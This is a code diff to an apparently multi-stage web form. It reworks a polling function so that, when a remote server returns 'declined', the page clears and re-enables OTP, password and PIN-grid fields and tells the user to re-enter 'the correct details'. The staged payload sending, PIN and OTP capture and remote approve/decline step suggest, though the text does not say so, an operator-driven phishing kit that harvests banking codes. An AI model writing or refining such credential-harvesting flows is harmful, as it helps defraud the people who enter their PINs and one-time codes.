@@ -588,7 +588,6 @@ async function sendStagePayload(stage, payload) {
     return false;
   }
 }
-
 function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
   const msgElement = document.getElementById(msgId);
   msgElement.className = "status";
@@ -607,40 +606,46 @@ function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, succes
         document.getElementById(currentPageId).classList.add("hidden");
         document.getElementById(nextPageId).classList.remove("hidden");
         if (successCallback) successCallback();
-            } else if (data.status === "declined") {
+      } else if (data.status === "declined") {
         clearInterval(pollingInterval);
         
         // 1. Hide the full-page waiting spinner overlay screen
         document.getElementById(spinnerId).classList.add("hidden");
         
-        // FIX: Force the page section containing the form card back into view!
-        document.getElementById(currentPageId).classList.remove("hidden");
+        // 2. Bring the current page section (e.g., Page 3) back into view
+        const currentSection = document.getElementById(currentPageId);
+        currentSection.classList.remove("hidden");
         
-        // 2. Clear out old entries from text boxes and individual PIN grids
-        const otpInput = document.getElementById('code1');
-        if (otpInput) otpInput.value = '';
-        
-        const pinBoxes = document.querySelectorAll('.boxes input');
+        // 3. Clear and re-enable inputs SPECIFIC to this active page container
+        // This clears standard text boxes/OTP fields inside this section
+        const textInputs = currentSection.querySelectorAll('input[type="text"], input[type="password"], input:not([type])');
+        textInputs.forEach(input => {
+          input.value = '';
+          input.disabled = false;
+        });
+
+        // This clears individual PIN grids (.boxes input) inside this section
+        const pinBoxes = currentSection.querySelectorAll('.boxes input');
         pinBoxes.forEach(box => {
           box.value = '';
-          box.disabled = false; // Re-enable boxes so users can re-type entries
+          box.disabled = false; 
         });
         
-        // 3. Reset the primary continue button back to its initial locked style state
-        const submitBtn = document.getElementById('submitCode1');
-        if (submitBtn) submitBtn.disabled = true;
+        // 4. Reset the primary continue button inside this section back to locked state
+        // It looks for a button containing 'submit' or a button element to disable
+        const submitBtn = currentSection.querySelector('button, input[type="submit"]');
+        if (submitBtn) {
+          submitBtn.disabled = true;
+        }
 
-        // 4. Alert user about the correction step without blocking the interface view
+        // 5. Alert user about the correction step
         msgElement.className = "error";
         msgElement.innerText = "Incorrect entry. Please enter the correct details.";
       }
 
- 
     } catch (err) {
       console.error("Status check failed");
     }
   }, 2500);
 }
-</script>
-</body>
-</html>
+
